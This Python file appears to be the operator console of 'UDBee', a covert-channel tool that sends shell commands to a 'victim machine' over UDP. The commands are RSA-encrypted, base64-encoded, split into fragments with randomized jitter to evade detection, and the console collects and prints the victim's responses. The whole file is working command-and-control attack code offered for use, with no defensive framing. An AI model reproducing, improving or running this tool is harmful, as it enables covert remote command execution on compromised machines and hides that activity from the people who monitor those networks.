import rsa, socket, random, time, sys, threading
from decryption import decrypt_message
from encryption import encrypt_message
from message_fragmentation import fragment_message
from port import get_available_port
import argparse
from prompt_toolkit import prompt
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.shortcuts import print_formatted_text
import base64

parser = argparse.ArgumentParser(description="UDBee - UDP Covert Channel Tool")
parser.add_argument("-ip", required=True, type=str, help="Target IP address, IPv4 only")
parser.add_argument("-fragments", type=int, default=12, help="Fragment size, default is 12 byte")
parser.add_argument("-delay", type=float, default=random.randint(0,3), help="Delay between fragments, default is 0-3")
parser.add_argument("-buffer", type=float, default=10000, help="Fragments buffer, default is 10000 (to prevent memory overflow)")
parser.add_argument("-jitter", type=float, default=0.2, help="Random +/- jitter to apply on each fragment delay")

args = parser.parse_args()

target_ip = args.ip
target_port = 27381
chunk_size = args.fragments
delay = args.delay
buffer_size = args.buffer
jitter = args.jitter
target_pub_key = None
my_pub_key = None
my_priv_key = None


def parse_public_key(text: str) -> rsa.PublicKey:
    text = text.replace("PublicKey(", "").replace(")", "")
    n_str, e_str = text.split(",")
    n = int(n_str.strip())
    e = int(e_str.strip())
    return rsa.PublicKey(n, e)


def get_response(port):
    global target_pub_key, buffer_size, target_ip, my_pub_key, my_priv_key
    ip = "0.0.0.0"
    received_chunks = {}
    excpected_chunks = None

    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            listen_socket.bind((ip, port))
            break
        except:
            continue
    listen_socket.settimeout(60)
    
    print_formatted_text(HTML(f"<ansiyellow>[ INFO ]</ansiyellow> <ansicyan>listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>"))
    try:
        while True:
            data, addr = listen_socket.recvfrom(2048)
            victim_ip, victim_port = addr
            part, total, index = data.decode('utf8').split('|', 2)
            total = int(total)
            index = int(index)

            if victim_ip != target_ip:
                continue
            if len(received_chunks) > buffer_size:
                listen_socket.close()
                print_formatted_text(HTML(f"<ansiyellow>[ INFO ]</ansiyellow> <ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>, buffer maximum size is reached!</ansicyan>"))
                return
            if part.startswith("PublicKey("):
                target_pub_key = parse_public_key(part)
                ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
                listen_socket.sendto(f"PublicKey({my_pub_key.n}, {my_pub_key.e})".encode('utf8'), (target_ip, target_port))
                print_formatted_text(HTML(f"[<ansigreen> SUCCESS </ansigreen>] <ansiblue>Successfully exchanged keys, you can now send commands securely.</ansiblue>"))
                listen_socket.close()
                print_formatted_text(HTML(f"<ansiyellow>[ INFO ]</ansiyellow> <ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>"))
                return

            if excpected_chunks == None:
                excpected_chunks = total
            
            received_chunks[index] = part
            if len(received_chunks) == excpected_chunks:
                try:
                    full_response = ''.join(received_chunks[i] for i in sorted(received_chunks))
                    decoded_response = base64.b64decode(full_response)
                    decypted_message = decrypt_message(decoded_response, my_priv_key)

                    if decypted_message["status"] == 200:
                        full_response = decypted_message["message"]
                    else:
                        print_formatted_text(HTML(f"<ansired>[ ERR ]</ansired> <ansired>Failed to decrypt a response received from <ansigreen>{victim_ip}:{victim_port}</ansigreen>, decryption key doesn't match</ansired>"))
                        return
                    print_formatted_text(HTML(f"<ansiyellow>[ INFO ]</ansiyellow> <ansicyan>received a response from</ansicyan> <ansigreen>{victim_ip}:{victim_port}</ansigreen><ansicyan> :</ansicyan>"))
                    print_formatted_text(HTML(f"<ansigreen>{full_response}</ansigreen>"))
                    listen_socket.close()
                    print_formatted_text(HTML(f"<ansiyellow>[ INFO ]</ansiyellow> <ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>"))
                    return
                except:
                     print_formatted_text(HTML(f"<ansired>[ ERR ]</ansired> <ansired>Failed to decrypt a response received from <ansigreen>{victim_ip}:{victim_port}</ansigreen>, there was an unknown problem.</ansired>"))
    except socket.timeout:
        print_formatted_text(HTML(f"<ansired>[ ERR ]</ansired> <ansimagenta>socket timedout while waiting for response.</ansimagenta>"))
    except:
        print_formatted_text(HTML(f"<ansired>[ ERR ]</ansired> <ansimagenta>there was an error while trying to get response</ansimagenta>"))
    finally:
        if listen_socket:
            listen_socket.close()


def send_command(message, listening_port):
    global my_priv_key, delay, jitter, target_ip, target_port, my_pub_key, target_pub_key
    attacking_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            attacking_sock.bind(("0.0.0.0", listening_port))
            break
        except:
            continue

    if target_pub_key == None:
        attacking_sock.sendto("gen_key".encode('utf8'), (target_ip, target_port))
        print_formatted_text(HTML(f"<ansired>[ ERR ]</ansired> <ansimagenta>Encryption keys was not exchanged, started exchanging now.</ansimagenta>"))
        return
    encrypted_message = encrypt_message(message, target_pub_key)

    if encrypted_message["status"] == 200:
        encrypted_message = encrypted_message["message"].encode('utf8')
    else:
        print_formatted_text(HTML(f"<ansired>[ ERR ]</ansired> <ansired>Failed to provide an encrypted connection, message was not sent.</ansired>"))
        return
    encrypted_message = base64.b64encode(encrypted_message).decode('utf8')
    chunks = fragment_message(encrypted_message, listening_port, chunk_size)
    for chunk in chunks:
        attacking_sock.sendto(chunk, (target_ip, target_port))
        jitter_delay = delay + random.uniform(-jitter, jitter)
        jitter_delay = max(0, jitter_delay)
        time.sleep(jitter_delay)
    attacking_sock.close()
        

def main():
    with patch_stdout():
        logo = f"""
<ansiyellow>
    █    ██ ▓█████▄  ▄▄▄▄   ▓█████ ▓█████ 
    ██  ▓██▒▒██▀ ██▌▓█████▄ ▓█   ▀ ▓█   ▀ 
    ▓██  ▒██░░██   █▌▒██▒ ▄██▒███   ▒███   
    ▓▓█  ░██░░▓█▄   ▌▒██░█▀  ▒▓█  ▄ ▒▓█  ▄ 
    ▒▒█████▓ ░▒████▓ ░▓█  ▀█▓░▒████▒░▒████▒
    ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░▒▓███▀▒░░ ▒░ ░░░ ▒░ ░
    ░░▒░ ░ ░  ░ ▒  ▒ ▒░▒   ░  ░ ░  ░ ░ ░  ░
    ░░░ ░ ░  ░ ░  ░  ░    ░    ░      ░   
    ░        ░     ░         ░  ░   ░  ░
            ░            ░
</ansiyellow>"""
        print_formatted_text(HTML(logo))
        print_formatted_text(HTML("\t🐝 <ansimagenta>UDBee</ansimagenta> <ansicyan>–</ansicyan> <ansigreen>Because TCP Is Too Mainstream</ansigreen>"))
        print_formatted_text(HTML("\t<ansimagenta>Developer:</ansimagenta> <ansicyan>@momhaidat</ansicyan>"))
        while True:
            command = prompt(HTML('\n<ansicyan>UDBee</ansicyan> <ansimagenta>> </ansimagenta>')).strip()
            if command.lower() in ["exit", "quit"]:
                print_formatted_text(HTML("<ansigreen>Stopped buzzing :)</ansigreen>"))
                sys.exit(1)

            elif command.lower() == "help":
                print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflict with one of special command, just put exec: before the command (e.g. exec:help)</ansiblue>"))

            else:
                if command.startswith("exec:"):
                    command = command.replace("exec:","")

                port = get_available_port()

                threads = []
                t1 = threading.Thread(target=send_command, args=(command, port))
                t2 = threading.Thread(target=get_response, args=(port,))
                threads.append(t1)
                threads.append(t2)

                for thread in threads:
                    thread.start()

main()
